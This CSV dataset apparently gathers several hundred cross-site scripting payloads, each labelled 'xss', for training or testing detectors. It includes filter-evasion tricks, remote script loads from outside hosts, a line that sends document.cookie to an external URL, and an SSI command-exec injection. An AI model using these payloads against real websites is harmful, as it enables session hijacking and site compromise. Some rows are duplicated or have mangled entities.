payload,label
"<table><TD BACKGROUND=""javascript:document.vulnerable=true;"">",xss
"<div STYLE=""background-image: url(javascript:document.vulnerable=true;)"">",xss
"<div STYLE=""background-image: url(&#1;javascript:document.vulnerable=true;)"">",xss
"<div STYLE=""width: expression(document.vulnerable=true);"">",xss
<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>,xss
"<img STYLE=""xss:expr/*XSS*/ession(document.vulnerable=true)"">",xss
"<XSS STYLE=""xss:expression(document.vulnerable=true)"">",xss
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>",xss
"<style TYPE=""text/javascript"">document.vulnerable=true;</style>",xss
"<style>.XSS{background-image:url(""javascript:document.vulnerable=true"");}</STYLE><A CLASS=XSS></a>",xss
"<style type=""text/css"">BODY{background:url(""javascript:document.vulnerable=true"")}</style>",xss
<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->,xss
"<base HREF=""javascript:document.vulnerable=true;//"">",xss
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>,xss
"<XML ID=I><X><C><![<IMG SRC=""javas]]<![cript:document.vulnerable=true;"">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>",xss
"<XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:document.vulnerable=true""></B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></span>",xss
"<html><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>""></BODY></html>",xss
<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>,xss
"<meta HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>document.vulnerable=true</SCRIPT>"">",xss
"<head><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-",xss
"<a href=""javascript#document.vulnerable=true;"">",xss
"<div onmouseover=""document.vulnerable=true;"">",xss
"<img src=""javascript:document.vulnerable=true;"">",xss
"<img dynsrc=""javascript:document.vulnerable=true;"">",xss
"<input type=""image"" dynsrc=""javascript:document.vulnerable=true;"">",xss
"<bgsound src=""javascript:document.vulnerable=true;"">",xss
&<script>document.vulnerable=true;</script>,xss
&{document.vulnerable=true;};,xss
<img src=&{document.vulnerable=true;};>,xss
"<link rel=""stylesheet"" href=""javascript:document.vulnerable=true;"">",xss
"<iframe src=""vbscript:document.vulnerable=true;"">",xss
"<img src=""mocha:document.vulnerable=true;"">",xss
"<img src=""livescript:document.vulnerable=true;"">",xss
"<a href=""about:<script>document.vulnerable=true;</script>"">",xss
"<meta http-equiv=""refresh"" content=""0;url=javascript:document.vulnerable=true;"">",xss
"<body onload=""document.vulnerable=true;"">",xss
"<div style=""background-image: url(javascript:document.vulnerable=true;);"">",xss
"<div style=""behaviour: url([link to code]);"">",xss
"<div style=""binding: url([link to code]);"">",xss
"<div style=""width: expression(document.vulnerable=true;);"">",xss
"<style type=""text/javascript"">document.vulnerable=true;</style>",xss
"<object classid=""clsid:..."" codebase=""javascript:document.vulnerable=true;"">",xss
<style><!--</style><script>document.vulnerable=true;//--></script>,xss
<<script>document.vulnerable=true;</script>,xss
<![<!--]]<script>document.vulnerable=true;//--></script>,xss
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->,xss
"<img src=""blah""onmouseover=""document.vulnerable=true;"">",xss
"<img src=""blah>"" onmouseover=""document.vulnerable=true;"">",xss
"<xml src=""javascript:document.vulnerable=true;"">",xss
"<xml id=""X""><a><b><script>document.vulnerable=true;</script>;</b></a></xml>",xss
"<div datafld=""b"" dataformatas=""html"" datasrc=""#X""></div>",xss
[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>,xss
<style>@import'http://www.securitycompass.com/xss.css';</style>,xss
"<meta HTTP-EQUIV=""Link"" Content=""<http://www.securitycompass.com/xss.css>; REL=stylesheet"">",xss
"<style>BODY{-moz-binding:url(""http://www.securitycompass.com/xssmoz.xml#xss"")}</style>",xss
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://www.securitycompass.com/scriptlet.html""></object>",xss
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://www.securitycompass.com/xss.htc""><xss:xss>XSS</xss:xss></html>",xss
"<script SRC=""http://www.securitycompass.com/xss.jpg""></script>",xss
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'""-->",xss
"<script a="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<script ="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<script a="">"" '' SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<script ""a='>'"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<script a=`>` SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<script a="">'>"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<script>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<div style=""binding: url(http://www.securitycompass.com/xss.js);""> [Mozilla]",xss
"&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;",xss
&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;,xss
&lt;/br style=a:expression(alert())&gt;,xss
&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;,xss
&lt;br size=\&quot;&amp;{alert(&#039;XSS&#039;)}\&quot;&gt;,xss
perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;\&quot;;&#039; &gt; out,xss
perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out,xss
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,xss
"<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location=""http://www.procheckup.com/?sid=""%2bdocument.cookie)>",xss
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,xss
<~/XSS STYLE=xss:expression(alert('XSS'))>,xss
"""><script>alert('XSS')</script>",xss
</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,xss
XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,xss
XSS STYLE=xss:e/**/xpression(alert('XSS'))>,xss
</XSS STYLE=xss:expression(alert('XSS'))>,xss
"';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//"";;alert(String.fromCharCode(88,83,83))//\"";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;"";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",xss
"';';;!--"";<;XSS>;=&;{()}",xss
<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;,xss
<;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>;,xss
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",xss
"<;BASE HREF="";javascript:alert(';XSS';);//"";>;",xss
"<;BGSOUND SRC="";javascript:alert(';XSS';);"";>;",xss
"<;BODY BACKGROUND="";javascript:alert(';XSS';);"";>;",xss
<;BODY ONLOAD=alert(';XSS';)>;,xss
"<;DIV STYLE="";background-image: url(javascript:alert(';XSS';))"";>;",xss
"<;DIV STYLE="";background-image: url(&;#1;javascript:alert(';XSS';))"";>;",xss
"<;DIV STYLE="";width: expression(alert(';XSS';));"";>;",xss
"<;FRAMESET>;<;FRAME SRC="";javascript:alert(';XSS';);"";>;<;/FRAMESET>;",xss
"<;IFRAME SRC="";javascript:alert(';XSS';);"";>;<;/IFRAME>;",xss
"<;INPUT TYPE="";IMAGE""; SRC="";javascript:alert(';XSS';);"";>;",xss
"<;IMG SRC="";javascript:alert(';XSS';);"";>;",xss
<;IMG SRC=javascript:alert(';XSS';)>;,xss
"<;IMG DYNSRC="";javascript:alert(';XSS';);"";>;",xss
"<;IMG LOWSRC="";javascript:alert(';XSS';);"";>;",xss
"<;IMG SRC="";http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"";>;",xss
Redirect 302 /a.jpg http://victimsite.com/admin.asp&;deleteuser,xss
"exp/*<;XSS STYLE=';no\xss:noxss("";*//*"";);",xss
"<;STYLE>;li {list-style-image: url("";javascript:alert(&#39;XSS&#39;)"";);}<;/STYLE>;<;UL>;<;LI>;XSS",xss
"<;IMG SRC=';vbscript:msgbox("";XSS"";)';>;",xss
"<;LAYER SRC="";http://ha.ckers.org/scriptlet.html"";>;<;/LAYER>;",xss
"<;IMG SRC="";livescript:[code]"";>;",xss
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE,xss
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=javascript:alert(';XSS';);"";>;",xss
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"";>;",xss
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0; URL=http://;URL=javascript:alert(';XSS';);"";>;",xss
"<;IMG SRC="";mocha:[code]"";>;",xss
"<;OBJECT TYPE="";text/x-scriptlet""; DATA="";http://ha.ckers.org/scriptlet.html"";>;<;/OBJECT>;",xss
<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>;,xss
"<;EMBED SRC="";http://ha.ckers.org/xss.swf""; AllowScriptAccess="";always"";>;<;/EMBED>;",xss
"a="";get"";;&;#10;b="";URL("";"";;&;#10;c="";javascript:"";;&;#10;d="";alert(';XSS';);"";)"";;&#10;eval(a+b+c+d);",xss
"<;STYLE TYPE="";text/javascript"";>;alert(';XSS';);<;/STYLE>;",xss
"<;IMG STYLE="";xss:expr/*XSS*/ession(alert(';XSS';))"";>;",xss
"<;XSS STYLE="";xss:expression(alert(';XSS';))"";>;",xss
"<;STYLE>;.XSS{background-image:url("";javascript:alert(';XSS';)"";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;",xss
"<;STYLE type="";text/css"";>;BODY{background:url("";javascript:alert(';XSS';)"";)}<;/STYLE>;",xss
"<;LINK REL="";stylesheet""; HREF="";javascript:alert(';XSS';);"";>;",xss
"<;LINK REL="";stylesheet""; HREF="";http://ha.ckers.org/xss.css"";>;",xss
<;STYLE>;@import';http://ha.ckers.org/xss.css';;<;/STYLE>;,xss
"<;META HTTP-EQUIV="";Link""; Content="";<;http://ha.ckers.org/xss.css>;; REL=stylesheet"";>;",xss
"<;STYLE>;BODY{-moz-binding:url("";http://ha.ckers.org/xssmoz.xml#xss"";)}<;/STYLE>;",xss
"<;TABLE BACKGROUND="";javascript:alert(';XSS';)"";>;<;/TABLE>;",xss
"<;TABLE>;<;TD BACKGROUND="";javascript:alert(';XSS';)"";>;<;/TD>;<;/TABLE>;",xss
<;HTML xmlns:xss>;,xss
"<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC="";javas]]>;<;![CDATA[cript:alert(';XSS';);"";>;]]>;",xss
"<;XML ID="";xss"";>;<;I>;<;B>;<;IMG SRC="";javas<;!-- -->;cript:alert(';XSS';)"";>;<;/B>;<;/I>;<;/XML>;",xss
"<;XML SRC="";http://ha.ckers.org/xsstest.xml""; ID=I>;<;/XML>;",xss
<;HTML>;<;BODY>;,xss
<;!--[if gte IE 4]>;,xss
"<;META HTTP-EQUIV="";Set-Cookie""; Content="";USERID=<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;"";>;",xss
"<;XSS STYLE="";behavior: url(http://ha.ckers.org/xss.htc);"";>;",xss
"<;SCRIPT SRC="";http://ha.ckers.org/xss.jpg"";>;<;/SCRIPT>;",xss
"<;!--#exec cmd="";/bin/echo ';<;SCRIPT SRC';"";-->;<;!--#exec cmd="";/bin/echo ';=http://ha.ckers.org/xss.js>;<;/SCRIPT>;';"";-->;",xss
<;? echo(';<;SCR)';;,xss
"<;BR SIZE="";&;{alert(';XSS';)}"";>;",xss
<;IMG SRC=JaVaScRiPt:alert(';XSS';)>;,xss
<;IMG SRC=javascript:alert(&;quot;XSS&;quot;)>;,xss
"<;IMG SRC=`javascript:alert("";RSnake says, ';XSS';"";)`>;",xss
"<;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>;",xss
<;IMG RC=&;#106;&;#97;&;#118;&;#97;&;#115;&;#99;&;#114;&;#105;&;#112;&;#116;&;#58;&;#97;&;#108;&;#101;&;#114;&;#116;&;#40;&;#39;&;#88;&;#83;&;#83;&;#39;&;#41;>;,xss
<;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&;#0000115&;#0000099&;#0000114&;#0000105&;#0000112&;#0000116&;#0000058&;#0000097&;#0000108&;#0000101&;#0000114&;#0000116&;#0000040&;#0000039&;#0000088&;#0000083&;#0000083&;#0000039&;#0000041>;,xss
"<;DIV STYLE="";background-image:\0075\0072\006C\0028';\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.10530053\0027\0029';\0029"";>;",xss
<;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;,xss
"<;HEAD>;<;META HTTP-EQUIV="";CONTENT-TYPE""; CONTENT="";text/html; charset=UTF-7"";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-",xss
"\"";;alert(';XSS';);//",xss
"<;/TITLE>;<;SCRIPT>;alert(""XSS"");<;/SCRIPT>;",xss
"<;STYLE>;@im\port';\ja\vasc\ript:alert("";XSS"";)';;<;/STYLE>;",xss
"<;IMG SRC="";jav&#x09;ascript:alert(';XSS';);"";>;",xss
"<;IMG SRC="";jav&;#x09;ascript:alert(';XSS';);"";>;",xss
"<;IMG SRC="";jav&;#x0A;ascript:alert(';XSS';);"";>;",xss
"<;IMG SRC="";jav&;#x0D;ascript:alert(';XSS';);"";>;",xss
"<;IMG&#x0D;SRC&#x0D;=&#x0D;"";&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;&#x0D;';&#x0D;X&#x0D;S&#x0D;S&#x0D;';&#x0D;)&#x0D;"";&#x0D;>;&#x0D;",xss
"perl -e ';print "";<;IM SRC=java\0script:alert("";XSS"";)>"";;';>; out",xss
"perl -e ';print "";&;<;SCR\0IPT>;alert("";XSS"";)<;/SCR\0IPT>;"";;'; >; out",xss
"<;IMG SRC=""; &;#14;  javascript:alert(';XSS';);"";>;",xss
"<;SCRIPT/XSS SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss
"<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert("";XSS"";)>;",xss
<;SCRIPT SRC=http://ha.ckers.org/xss.js,xss
<;SCRIPT SRC=//ha.ckers.org/.j>;,xss
"<;IMG SRC="";javascript:alert(';XSS';)"";",xss
<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;,xss
"<;<;SCRIPT>;alert("";XSS"";);//<;<;/SCRIPT>;",xss
"<;IMG "";"";"";>;<;SCRIPT>;alert("";XSS"";)<;/SCRIPT>;"";>;",xss
<;SCRIPT>;a=/XSS/,xss
"<;SCRIPT a="";>;""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss
"<;SCRIPT ="";blah""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss
"<;SCRIPT a="";blah""; ';'; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss
"<;SCRIPT "";a=';>;';""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss
"<;SCRIPT a=`>;` SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss
"<;SCRIPT>;document.write("";<;SCRI"";);<;/SCRIPT>;PT SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss
"<;SCRIPT a="";>';>""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss
"<;A HREF="";http://66.102.7.147/"";>;XSS<;/A>;",xss
"<;A HREF="";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"";>;XSS<;/A>;",xss
"<;A HREF="";http://1113982867/"";>;XSS<;/A>;",xss
"<;A HREF="";http://0x42.0x0000066.0x7.0x93/"";>;XSS<;/A>;",xss
"<;A HREF="";http://0102.0146.0007.00000223/"";>;XSS<;/A>;",xss
"<;A HREF="";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/"";>;XSS<;/A>;",xss
"<;A HREF="";//www.google.com/"";>;XSS<;/A>;",xss
"<;A HREF="";//google"";>;XSS<;/A>;",xss
"<;A HREF="";http://ha.ckers.org@google"";>;XSS<;/A>;",xss
"<;A HREF="";http://google:ha.ckers.org"";>;XSS<;/A>;",xss
"<;A HREF="";http://google.com/"";>;XSS<;/A>;",xss
"<;A HREF="";http://www.google.com./"";>;XSS<;/A>;",xss
"<;A HREF="";javascript:document.location=';http://www.google.com/';"";>;XSS<;/A>;",xss
"<;A HREF="";http://www.gohttp://www.google.com/ogle.com/"";>;XSS<;/A>;",xss
<script>document.vulnerable=true;</script>,xss
"<img SRC=""jav ascript:document.vulnerable=true;"">",xss
"<img SRC=""javascript:document.vulnerable=true;"">",xss
"<img SRC="" &#14; javascript:document.vulnerable=true;"">",xss
"<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>",xss
<<SCRIPT>document.vulnerable=true;//<</SCRIPT>,xss
<script <B>document.vulnerable=true;</script>,xss
"<img SRC=""javascript:document.vulnerable=true;""",xss
"<iframe src=""javascript:document.vulnerable=true; <",xss
<script>a=/XSS/\ndocument.vulnerable=true;</script>,xss
"\"";document.vulnerable=true;;//",xss
</title><SCRIPT>document.vulnerable=true;</script>,xss
"<input TYPE=""IMAGE"" SRC=""javascript:document.vulnerable=true;"">",xss
"<body BACKGROUND=""javascript:document.vulnerable=true;"">",xss
<body ONLOAD=document.vulnerable=true;>,xss
"<img DYNSRC=""javascript:document.vulnerable=true;"">",xss
"<img LOWSRC=""javascript:document.vulnerable=true;"">",xss
"<bgsound SRC=""javascript:document.vulnerable=true;"">",xss
"<br SIZE=""&{document.vulnerable=true}"">",xss
"<LAYER SRC=""javascript:document.vulnerable=true;""></LAYER>",xss
"<link REL=""stylesheet"" HREF=""javascript:document.vulnerable=true;"">",xss
"<style>li {list-style-image: url(""javascript:document.vulnerable=true;"");</STYLE><UL><LI>XSS",xss
<img SRC='vbscript:document.vulnerable=true;'>,xss
1script3document.vulnerable=true;1/script3,xss
"<meta HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:document.vulnerable=true;"">",xss
"<meta HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:document.vulnerable=true;"">",xss
"<IFRAME SRC=""javascript:document.vulnerable=true;""></iframe>",xss
"<FRAMESET><FRAME SRC=""javascript:document.vulnerable=true;""></frameset>",xss
"<table BACKGROUND=""javascript:document.vulnerable=true;"">",xss
"<table><TD BACKGROUND=""javascript:document.vulnerable=true;"">",xss
"<div STYLE=""background-image: url(javascript:document.vulnerable=true;)"">",xss
"<div STYLE=""background-image: url(&#1;javascript:document.vulnerable=true;)"">",xss
"<div STYLE=""width: expression(document.vulnerable=true);"">",xss
<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>,xss
"<img STYLE=""xss:expr/*XSS*/ession(document.vulnerable=true)"">",xss
"<XSS STYLE=""xss:expression(document.vulnerable=true)"">",xss
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>",xss
"<style TYPE=""text/javascript"">document.vulnerable=true;</style>",xss
"<style>.XSS{background-image:url(""javascript:document.vulnerable=true"");}</STYLE><A CLASS=XSS></a>",xss
"<style type=""text/css"">BODY{background:url(""javascript:document.vulnerable=true"")}</style>",xss
<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->,xss
"<base HREF=""javascript:document.vulnerable=true;//"">",xss
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>,xss
"<XML ID=I><X><C><![<IMG SRC=""javas]]<![cript:document.vulnerable=true;"">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>",xss
"<XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:document.vulnerable=true""></B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></span>",xss
"<html><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>""></BODY></html>",xss
<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>,xss
"<meta HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>document.vulnerable=true</SCRIPT>"">",xss
"<head><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-",xss
"<a href=""javascript#document.vulnerable=true;"">",xss
"<div onmouseover=""document.vulnerable=true;"">",xss
"<img src=""javascript:document.vulnerable=true;"">",xss
"<img dynsrc=""javascript:document.vulnerable=true;"">",xss
"<input type=""image"" dynsrc=""javascript:document.vulnerable=true;"">",xss
"<bgsound src=""javascript:document.vulnerable=true;"">",xss
&<script>document.vulnerable=true;</script>,xss
&{document.vulnerable=true;};,xss
<img src=&{document.vulnerable=true;};>,xss
"<link rel=""stylesheet"" href=""javascript:document.vulnerable=true;"">",xss
"<iframe src=""vbscript:document.vulnerable=true;"">",xss
"<img src=""mocha:document.vulnerable=true;"">",xss
"<img src=""livescript:document.vulnerable=true;"">",xss
"<a href=""about:<script>document.vulnerable=true;</script>"">",xss
"<meta http-equiv=""refresh"" content=""0;url=javascript:document.vulnerable=true;"">",xss
"<body onload=""document.vulnerable=true;"">",xss
"<div style=""background-image: url(javascript:document.vulnerable=true;);"">",xss
"<div style=""behaviour: url([link to code]);"">",xss
"<div style=""binding: url([link to code]);"">",xss
"<div style=""width: expression(document.vulnerable=true;);"">",xss
"<style type=""text/javascript"">document.vulnerable=true;</style>",xss
"<object classid=""clsid:..."" codebase=""javascript:document.vulnerable=true;"">",xss
<style><!--</style><script>document.vulnerable=true;//--></script>,xss
<<script>document.vulnerable=true;</script>,xss
<![<!--]]<script>document.vulnerable=true;//--></script>,xss
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->,xss
"<img src=""blah""onmouseover=""document.vulnerable=true;"">",xss
"<img src=""blah>"" onmouseover=""document.vulnerable=true;"">",xss
"<xml src=""javascript:document.vulnerable=true;"">",xss
"<xml id=""X""><a><b><script>document.vulnerable=true;</script>;</b></a></xml>",xss
"<div datafld=""b"" dataformatas=""html"" datasrc=""#X""></div>",xss
[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>,xss
<style>@import'http://www.securitycompass.com/xss.css';</style>,xss
"<meta HTTP-EQUIV=""Link"" Content=""<http://www.securitycompass.com/xss.css>; REL=stylesheet"">",xss
"<style>BODY{-moz-binding:url(""http://www.securitycompass.com/xssmoz.xml#xss"")}</style>",xss
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://www.securitycompass.com/scriptlet.html""></object>",xss
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://www.securitycompass.com/xss.htc""><xss:xss>XSS</xss:xss></html>",xss
"<script SRC=""http://www.securitycompass.com/xss.jpg""></script>",xss
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'""-->",xss
"<script a="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<script ="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<script a="">"" '' SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<script ""a='>'"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<script a=`>` SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<script a="">'>"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<script>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<div style=""binding: url(http://www.securitycompass.com/xss.js);""> [Mozilla]",xss
""";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert("";XSS"";)>;",xss
<;/script>;<;script>;alert(1)<;/script>;,xss
<;/br style=a:expression(alert())>;,xss
<;scrscriptipt>;alert(1)<;/scrscriptipt>;,xss
"<;br size=\"";&;{alert(&#039;XSS&#039;)}\"";>;",xss
"perl -e &#039;print \"";<;IMG SRC=java\0script:alert(\"";XSS\"";)>;\"";;&#039; >; out",xss
"perl -e &#039;print \"";<;SCR\0IPT>;alert(\"";XSS\"";)<;/SCR\0IPT>;\"";;&#039; >; out",xss
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,xss
"<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location=""http://www.procheckup.com/?sid=""%2bdocument.cookie)>",xss
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,xss
<~/XSS STYLE=xss:expression(alert('XSS'))>,xss
"""><script>alert('XSS')</script>",xss
</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,xss
XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,xss
XSS STYLE=xss:e/**/xpression(alert('XSS'))>,xss
</XSS STYLE=xss:expression(alert('XSS'))>,xss
">""><script>alert(""XSS"")</script>&",xss
"""><STYLE>@import""javascript:alert('XSS')"";</STYLE>",xss
">""'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>",xss
>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>,xss
'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e',xss
"'';!--""<XSS>=&{()}",xss
"<IMG SRC=""javascript:alert('XSS');"">",xss
